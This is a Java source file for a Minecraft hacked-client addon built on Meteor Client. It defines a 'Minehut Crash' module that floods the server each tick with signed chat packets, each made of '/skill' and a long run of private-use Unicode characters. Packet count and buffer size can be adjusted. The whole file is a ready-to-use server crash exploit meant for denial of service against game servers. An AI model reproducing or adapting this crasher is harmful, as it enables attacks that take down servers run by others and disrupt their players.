package com.x310.clarity.features.crashers.impl;

import com.x310.clarity.Main;
import com.x310.clarity.features.crashers.Crasher;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.mixin.ClientPlayNetworkHandlerAccessor;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.encryption.NetworkEncryptionUtils;
import net.minecraft.network.message.LastSeenMessagesCollector;
import net.minecraft.network.message.MessageBody;
import net.minecraft.network.message.MessageSignatureData;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;

import java.time.Instant;

public class SkillCrash2 extends Crasher {
    private final Setting<Integer> amount = sg.add(new IntSetting.Builder()
        .name("Amount")
        .description("Packets per tick.")
        .defaultValue(15)
        .min(1)
        .max(100)
        .sliderMax(100)
        .build()
    );

    private final Setting<Integer> buffer = sg.add(new IntSetting.Builder()
        .name("Buffer")
        .description("Spam buffer size.")
        .defaultValue(248)
        .min(1)
        .max(249)
        .sliderMax(249)
        .build()
    );

    public SkillCrash2() {
        super(Main.CRASH_GROUP, "Minehut Crash", "Spams ChatMessageC2SPacket packets with /skill and big amount of bytes.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        ClientPlayNetworkHandler handler = mc.getNetworkHandler();
        String spam = "/skill " + "\uE400".repeat(buffer.get());
        Instant instant = Instant.now();
        long l = NetworkEncryptionUtils.SecureRandomUtil.nextLong();
        LastSeenMessagesCollector.LastSeenMessages lastSeenMessages = ((ClientPlayNetworkHandlerAccessor) handler).getLastSeenMessagesCollector().collect();
        MessageSignatureData messageSignatureData = ((ClientPlayNetworkHandlerAccessor) handler).getMessagePacker().pack(new MessageBody(spam, instant, l, lastSeenMessages.lastSeen()));

        for (int i = 0; i < amount.get(); i++) {
            handler.sendPacket(new ChatMessageC2SPacket(spam, instant, l, messageSignatureData, lastSeenMessages.update()));
        }
    }
}
